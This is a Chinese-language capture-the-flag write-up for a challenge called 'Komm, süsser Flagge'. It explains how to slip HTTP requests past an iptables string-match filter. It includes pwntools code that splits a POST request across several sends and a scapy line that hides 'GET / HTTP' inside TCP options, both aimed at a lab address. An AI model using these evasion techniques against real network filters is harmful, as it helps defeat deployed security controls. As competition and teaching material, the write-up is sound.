## Komm, süsser Flagge

### 我的 POST

查了查说是这个 [bm 算法有问题](https://serverfault.com/questions/1141991/what-is-the-difference-bm-and-kmp-algorithms-in-iptables-string-search)。也不知道 a matching could be spread over multiple blocks 究竟是什么情况，但姑且就猜是不能跨 IP packet 边界匹配 TCP data？

于是写了这么个代码（其实我也不确定两次 `send` 是不是一定会导致两个 packet）：

```python
from pwn import *

r = remote('192.168.23.1', 18080)
r.send(b'P')
r.send(b'OST / HTTP/1.1\r\n')
r.send(b'Host: foobar\r\n')
r.send(b'Content-Length: 101\r\n\r\n')
r.send(b'<TOKEN_HERE>')
data = r.recv()
print(data)
```

反正就拿到 flag 了。

### 我的 P

上面一样的代码就行…… 但我也不知道为啥行。是不是组委会配错了？

### 我的 GET

这题思路很早就有了，只要往 TCP options 里塞个字符串 `GET / HTTP` 就行。但我一开始试了试 `setsockopt`，不让随便设置 TCP options，也不知道什么工具能做这么底层的操作。

后来发现 scapy 可以。网上随便找了个 scapy 实现 [TCP 握手的代码](https://gist.github.com/tintinweb/8523a9a43a2fb61a6770) 改了一下，完整代码在 [res/komm_my_get.py](res/komm_my_get.py)。

基本上改的地方就是：

```python
self.l4 = IP(dst=target[0])/TCP(sport=self.sport, dport=self.dport, flags=0,                                                   seq=random.randrange(0,2**32), options=[(88, "GET / HTTP")])
```